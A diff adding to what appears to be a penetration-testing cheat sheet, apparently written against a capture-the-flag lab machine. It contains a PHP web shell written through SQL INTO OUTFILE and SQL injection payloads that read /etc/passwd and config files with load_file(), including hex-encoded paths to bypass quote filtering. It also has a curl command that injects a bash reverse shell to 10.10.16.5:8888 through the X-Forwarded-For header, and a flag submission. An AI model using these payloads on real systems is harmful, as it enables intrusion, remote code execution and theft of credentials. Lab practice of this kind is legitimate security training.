@@ -319,3 +319,25 @@ From the SQL console we can write a web shell:
 ```sql
 SELECT "<?php system($_GET['c']); ?>" into outfile "/var/www/html/sh3ll.php"
 ```
+### MYSQL Read content of a file
+Need the `**filepriv**`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`
+To read a file you need the FILE right (allow you to use load_file()) and the file full path.
+```sql
+# You can also use if there are some restrictions
+union all select 1,@@secure_file_priv,3,4;-- -
+
+# Classic use
+union all select load_file('/etc/passwd'),2,3,4;-- -
+(!!!!!/var/www/html/config.php)
+
+# If quotes are filtered, you can use hexa
+union all select load_file(0x2f6574632f706173737764),2,3,4;-- -
+```
+### Using CURL
+```console
+curl -s -X POST http://10.10.11.128 -d "player=admin' union select user();-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
+    #Sorry, admin you are not eligible due to already qualifying. -> admin
+    
+# [X-Forwarded-For Exploitation](https://github.com/thotrangyeuduoi/template/blob/master/example_attack/X-Forwarded-For%20Exploitation.md)
+curl -X GET -H 'X-FORWARDED-FOR: ;bash -c "bash -i >& /dev/tcp/10.10.16.5/8888 0>&1";' --cookie "PHPSESSID=v019sde6sgv2od2oaaq71g813n" 'http://10.10.11.128/firewall.php'
+curl -s -X POST -b 'PHPSESSID=tie6r4uno69o57gbuesapskfku' --data-binary 'flag=UHC{F1rst_5tep_2_Qualify}' 'http://10.10.11.128/challenge.php' -L
